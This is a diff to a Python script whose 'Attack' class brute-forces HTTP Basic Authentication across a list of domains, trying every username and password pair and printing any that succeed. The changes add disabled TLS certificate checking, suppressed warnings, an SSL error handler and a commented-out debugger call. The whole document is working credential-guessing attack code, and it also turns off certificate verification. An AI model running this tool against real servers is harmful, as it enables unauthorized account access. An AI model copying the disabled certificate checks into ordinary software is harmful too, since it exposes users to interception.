@@ -4,6 +4,10 @@ from requests.auth import HTTPBasicAuth
 from threading import Thread
 import time
 from colorama import init, Fore, Back, Style
+import pdb
+import urllib3
+import ssl
+urllib3.disable_warnings()
 
 class File():
     def __init__(self, fileName, mode):
@@ -66,13 +70,13 @@ class Attack:
     def bruter(self, url, users, passwords, verbose):
         try:
             for url in self.domains:
-                url = "http://" + url
-                r = requests.get(url)
+                r = requests.get(url, verify=ssl.CERT_NONE)
+                #pdb.set_trace()
                 self.status = False
                 if r.status_code == 401:
                     for user in users:
                         for passw in passwords:
-                            resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw))
+                            resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw), verify=ssl.CERT_NONE)
                             if (resp.status_code == 200):
                                 print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
                                 self.status = True
@@ -85,6 +89,8 @@ class Attack:
                     print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
         except requests.ConnectionError:
             pass
+        except requests.exceptions.SSLError:
+            print("ssl")
 
 if __name__ == '__main__':
     try:
